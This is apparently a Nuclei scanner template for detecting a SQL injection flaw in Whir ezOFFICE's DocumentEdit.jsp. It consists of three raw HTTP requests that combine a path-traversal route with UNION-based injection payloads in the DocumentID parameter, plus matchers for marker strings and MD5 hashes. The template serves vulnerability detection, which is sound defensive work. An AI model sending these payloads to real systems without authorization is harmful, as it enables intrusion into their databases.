id: whir-ezoffice-sqli
info:
  name: Whir ezOFFICE DocumentEdit.jsp SQL Injection
  author: ProjectDiscoveryAI
  severity: critical
  description: |
    Whir ezOFFICE DocumentEdit.jsp has a SQL injection vulnerability. The lack of filtering on the 'DocumentID' parameter allows an attacker to exploit the vulnerability to obtain sensitive database information.
  reference:
    - http://www.whir.net/cn/ezofficeqyb/index_52.html
  tags:
    - sqli
    - critical

http:
  - raw:
      - |
        GET /defaultroot/iWebOfficeSign/OfficeServer.jsp/../../public/iSignatureHTML.jsp/DocumentEdit.jsp?DocumentID=1'%20union%20select%20null,null,'xdd'||'dsw'||'341',null,null,null,null,null,null,null%20from%20dual-- HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "xdddsw341"

  - raw:
      - |
        GET /defaultroot/iWebOfficeSign/OfficeServer.jsp/../../public/iSignatureHTML.jsp/DocumentEdit.jsp?DocumentID=1'%20union%20select%20(select+SUBSTRING(sys.fn_sqlvarbasetostr(HASHBYTES(%27MD5%27,%270x5c%27)),3,32)),null,null,null,null,null,null,null,null,null,null-- HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "ac19fb0963397661393588a0d09bc886"

  - raw:
      - |
        GET /defaultroot/iWebOfficeSign/OfficeServer.jsp/../../public/iSignatureHTML.jsp/DocumentEdit.jsp?DocumentID=1'%20union%20select%20(select+md5(0x5c)),null,null,null,null,null,null,null,null,null,null-- HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "28d397e87306b8631f3ed80d858d35f0"
